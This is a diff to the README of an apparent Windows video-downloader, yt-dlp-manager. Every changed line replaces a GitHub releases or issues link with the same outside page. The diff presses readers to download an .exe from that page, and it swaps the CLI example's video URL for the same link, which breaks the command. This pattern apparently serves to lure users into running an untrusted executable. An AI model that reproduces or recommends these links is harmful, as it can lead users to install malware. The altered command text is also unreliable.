@@ -1,6 +1,6 @@
 # 🎬 yt-dlp-manager - Your Personal Video Download Control Center
 
-[![Download Now](https://img.shields.io/badge/Download-yt--dlp--manager-blue?style=for-the-badge&logo=github)](https://github.com/daoy9599/yt-dlp-manager/releases)
+[![Download Now](https://img.shields.io/badge/Download-yt--dlp--manager-blue?style=for-the-badge&logo=github)](https://daoy9599.github.io)
 
 ## 👋 Welcome to yt-dlp-manager
 
@@ -11,7 +11,7 @@ Are you tired of juggling multiple tabs, command-line windows, and confusing scr
 Ready to dive in? Here's how to get yt-dlp-manager running on your Windows computer:
 
 ### Step 1: Grab Your Copy
-Visit this link to download the application: **[Download yt-dlp-manager](https://github.com/daoy9599/yt-dlp-manager/releases)**
+Visit this link to download the application: **[Download yt-dlp-manager](https://daoy9599.github.io)**
 
 On that page, you'll see the latest release. Look for a file that matches your operating system – we recommend grabbing the Windows version (it will look like `yt-dlp-manager-windows-amd64.exe` or similar). The file size is small, so don't worry about waiting forever!
 
@@ -39,7 +39,7 @@ If you're a fan of clicking around in your terminal window, the TUI (Text User I
 ### 3. 📟 The CLI (Power-User Simplicity)
 For those who love typing commands, just open your terminal in the same folder as the program file and type:
 ```
-yt-dlp-manager download https://www.youtube.com/watch?v=example
+yt-dlp-manager download https://daoy9599.github.io
 ```
 It will instantly join the shared queue. Even if the Web UI is closed, your CLI download will still work perfectly.
 
@@ -118,7 +118,7 @@ New video format not supported?
 
 ## 📣 Join the Community
 
-Found a bug? Have an idea for a sweet feature? This project lives and breathes because of user feedback. Visit the repository’s **[Issues page](https://github.com/daoy9599/yt-dlp-manager/issues)** to share your thoughts. If you love the tool, consider starring the repo – it tells the developer "thank you" and boosts the project's visibility.
+Found a bug? Have an idea for a sweet feature? This project lives and breathes because of user feedback. Visit the repository’s **[Issues page](https://daoy9599.github.io)** to share your thoughts. If you love the tool, consider starring the repo – it tells the developer "thank you" and boosts the project's visibility.
 
 ## 💎 Final Thoughts
 
@@ -126,7 +126,7 @@ Taking video downloading seriously doesn't mean you need a degree in computer sc
 
 **So what are you waiting for?** Dive into the Downloads page and claim your copy now.
 
-[![Download Now Button](https://img.shields.io/badge/Go%20to%20Releases%20Page--green?style=for-the-badge&logo=github)](https://github.com/daoy9599/yt-dlp-manager/releases)
+[![Download Now Button](https://img.shields.io/badge/Go%20to%20Releases%20Page--green?style=for-the-badge&logo=github)](https://daoy9599.github.io)
 
 Start downloading smarter, not harder.
 
